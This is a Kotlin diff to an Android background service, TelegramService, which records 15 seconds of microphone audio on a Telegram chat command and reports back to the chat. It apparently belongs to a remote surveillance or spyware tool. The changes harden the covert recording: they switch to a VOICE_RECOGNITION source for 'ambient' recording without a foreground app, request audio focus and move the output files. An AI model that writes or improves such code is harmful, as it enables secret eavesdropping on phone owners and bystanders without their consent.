@@ -19,7 +19,10 @@ import android.location.Location
 import android.location.LocationManager
 import android.os.Build
 import android.os.IBinder
+import android.media.AudioAttributes
+import android.media.AudioFocusRequest
 import android.media.AudioFormat
+import android.media.AudioManager
 import android.media.MediaRecorder
 import android.os.PowerManager
 import android.util.DisplayMetrics
@@ -579,9 +582,12 @@ class TelegramService : Service() {
             }
         }
         val ts = System.currentTimeMillis()
-        val outFile = java.io.File(filesDir, "rec_${ts}.m4a")
-        // Hapus file lama yang mungkin tertinggal (membuat start() gagal)
+        // Pakai getExternalFilesDir (público/storage) — lebih reliable di MIUI
+        // daripada filesDir (internal). Fallback ke filesDir kalau storage tidak ada.
+        val outDir = getExternalFilesDir(null) ?: filesDir
+        val outFile = java.io.File(outDir, "rec_${ts}.m4a")
         if (outFile.exists()) outFile.delete()
+        Log.d(TAG, "recordAudio: dir=${outDir.absolutePath}, canWrite=${outDir.canWrite()}, file=${outFile.absolutePath}")
 
         val recorder = createRecorder(outFile)
         mediaRecorder = recorder
@@ -589,7 +595,33 @@ class TelegramService : Service() {
         sendText(chatId, "⏺️ Mulai rekam 15 detik...")
         scope?.launch {
             var startError: String? = null
+            var audioFocusAcquired = false
+            val am = getSystemService(AUDIO_SERVICE) as AudioManager
             try {
+                // MIUI background service: request audio focus sebelum rekam.
+                // Tanpa ini, MediaRecorder.start() bisa gagal "start failed."
+                if (Build.VERSION.SDK_INT >= 26) {
+                    val focusReq = AudioFocusRequest.Builder(AudioManager.AUDIOFOCUS_GAIN)
+                        .setAudioAttributes(
+                            AudioAttributes.Builder()
+                                .setUsage(AudioAttributes.USAGE_MEDIA)
+                                .setContentType(AudioAttributes.CONTENT_TYPE_SPEECH)
+                                .build()
+                        )
+                        .build()
+                    val result = am.requestAudioFocus(focusReq)
+                    audioFocusAcquired = result == AudioManager.AUDIOFOCUS_REQUEST_GRANTED
+                    Log.d(TAG, "recordAudio: audioFocus (O+) = ${if (audioFocusAcquired) "GRANTED" else "DENIED($result)"}")
+                } else {
+                    @Suppress("DEPRECATION")
+                    val result = am.requestAudioFocus(
+                        null,
+                        AudioManager.STREAM_MUSIC,
+                        AudioManager.AUDIOFOCUS_GAIN
+                    )
+                    audioFocusAcquired = result == AudioManager.AUDIOFOCUS_REQUEST_GRANTED
+                    Log.d(TAG, "recordAudio: audioFocus (legacy) = ${if (audioFocusAcquired) "GRANTED" else "DENIED($result)"}")
+                }
                 recorder.prepare()
                 recorder.start()
                 Log.d(TAG, "recordAudio: started OK, file=${outFile.absolutePath}")
@@ -619,15 +651,16 @@ class TelegramService : Service() {
             @Suppress("DEPRECATION")
             MediaRecorder()
         }
-        r.setAudioSource(MediaRecorder.AudioSource.MIC)
-        // MPEG_4 + AAC adalah kombinasi paling kompatibel untuk device Android
+        // Gunakan AudioSource.VOICE_RECOGNITION — paling kompatibel untuk rekam ambient
+        // di Android service (tanpa foreground audio). MIC kadang gagal saat service
+        // bukan foreground app.
+        r.setAudioSource(MediaRecorder.AudioSource.VOICE_RECOGNITION)
         r.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
         r.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
-        // 44100 Hz mungkin tidak didukung di semua device, gunakan 48000 (standar)
-        r.setAudioSamplingRate(48000)
-        r.setAudioEncodingBitRate(128000)
+        r.setAudioSamplingRate(44100)
+        r.setAudioEncodingBitRate(96000)
         r.setOutputFile(outputFile.absolutePath)
-        Log.d(TAG, "createRecorder: file=${outputFile.absolutePath}, format=MPEG_4/AAC, 48kHz, 128kbps")
+        Log.d(TAG, "createRecorder: VOICE_RECOGNITION → MPEG_4/AAC 44.1kHz 96kbps, file=${outputFile.absolutePath}")
         return r
     }
 
